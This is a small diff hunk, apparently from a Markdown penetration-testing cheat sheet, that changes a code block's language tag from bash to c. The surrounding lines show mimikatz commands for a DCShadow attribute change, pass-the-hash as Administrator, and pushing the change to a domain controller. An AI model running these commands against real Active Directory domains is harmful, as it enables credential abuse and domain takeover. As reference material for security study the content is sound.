@@ -936,7 +936,7 @@ mimikatz # lsadump::dcshadow /object:root1user /attribute:Description /value="He
 ```
 
 **2 instance :** *with enough privileges of DA to push the values : 
-```bash
+```c
 mimikatz # sekurlsa::pth /user:Administrator /domain:$domain /ntlm:$admin_hash /impersonate
 mimikatz # lsadump::dcshadow /push
 ```
